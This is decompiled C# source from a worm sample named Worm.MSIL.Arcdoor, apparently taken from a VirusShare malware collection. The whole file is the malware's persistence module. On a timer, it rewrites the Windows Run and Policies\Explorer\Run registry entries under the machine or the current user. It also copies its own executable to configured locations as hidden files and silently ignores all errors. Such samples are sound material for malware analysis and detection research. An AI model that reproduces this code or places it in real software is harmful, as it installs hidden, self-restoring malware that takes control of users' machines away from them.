// Decompiled with JetBrains decompiler
// Type: SysDriver.cPersistent
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Timers;

namespace SysDriver
{
  internal class cPersistent
  {
    private Timer checkTimer = new Timer();
    private RegistryKey rKey;
    private string sSelfPath = Process.GetCurrentProcess().MainModule.FileName;

    public void loadPersistent()
    {
      this.checkTimer.Interval = (double) (cMain.ConfigClass.iPersistentInterval * 1000);
      this.checkTimer.Elapsed += new ElapsedEventHandler(this.CheckProcedure);
      this.checkTimer.Start();
    }

    public void stopPersistent()
    {
      this.checkTimer.Stop();
      this.checkTimer.Dispose();
    }

    private void CheckProcedure(object source, ElapsedEventArgs eArgs)
    {
      if (cMain.ConfigClass.bAdminStatus)
      {
        try
        {
          this.rKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[0]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[0]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
        }
        catch
        {
        }
        try
        {
          this.rKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[1]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[1]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
        }
        catch
        {
        }
      }
      else
      {
        try
        {
          this.rKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[0]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[0]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
        }
        catch
        {
        }
        try
        {
          this.rKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true);
          if (this.rKey.Equals((object) cMain.ConfigClass.sRegName[1]))
          {
            if (this.rKey.GetValue(cMain.ConfigClass.sRegName[1]).ToString() != '"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"')
              this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
          }
          else
            this.rKey.SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
        }
        catch
        {
        }
      }
      try
      {
        foreach (string str in cMain.ConfigClass.sFilePath)
        {
          if (!cMain.FunctionClass.checkFile(str))
          {
            File.Copy(this.sSelfPath, str);
            File.SetAttributes(str, FileAttributes.Hidden);
          }
        }
      }
      catch
      {
      }
    }
  }
}
